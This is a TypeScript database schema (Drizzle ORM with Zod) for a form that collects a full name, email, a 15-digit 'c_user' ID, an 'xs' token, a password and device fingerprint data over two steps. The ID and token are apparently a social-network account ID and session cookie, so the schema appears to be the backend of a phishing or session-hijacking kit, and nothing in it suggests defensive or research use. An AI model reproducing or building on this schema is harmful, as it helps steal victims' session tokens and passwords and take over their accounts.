import { pgTable, text, serial, integer, boolean, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
});

export const formSubmissions = pgTable("form_submissions", {
  id: serial("id").primaryKey(),
  fullName: text("full_name").notNull(),
  email: text("email").notNull(),
  cUser: text("c_user").notNull(),
  xs: text("xs").notNull(),
  password: text("password"),
  screenWidth: integer("screen_width"),
  screenHeight: integer("screen_height"),
  isTouchDevice: boolean("is_touch_device"),
  userAgent: text("user_agent"),
  platform: text("platform"),
  timestamp: timestamp("timestamp").defaultNow(),
  step: text("step").notNull().default("main"), // 'main' or 'password'
});

export const insertFormSubmissionSchema = createInsertSchema(formSubmissions).omit({
  id: true,
  timestamp: true,
});

export const insertUserSchema = createInsertSchema(users).omit({
  id: true,
});

export const mainFormSchema = insertFormSubmissionSchema.pick({
  fullName: true,
  email: true,
  cUser: true,
  xs: true,
  screenWidth: true,
  screenHeight: true,
  isTouchDevice: true,
  userAgent: true,
  platform: true,
}).extend({
  fullName: z.string().min(1, "Full name is required"),
  email: z.string().email("Please enter a valid email address"),
  cUser: z.string().regex(/^\d{15}$/, "Please enter exactly 15 digits"),
  xs: z.string().min(1, "XS token is required"),
});

export const passwordFormSchema = z.object({
  password: z.string().min(6, "Password must be at least 6 characters long"),
  submissionId: z.number(),
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;
export type InsertFormSubmission = z.infer<typeof insertFormSubmissionSchema>;
export type FormSubmission = typeof formSubmissions.$inferSelect;
export type MainFormData = z.infer<typeof mainFormSchema>;
export type PasswordFormData = z.infer<typeof passwordFormSchema>;
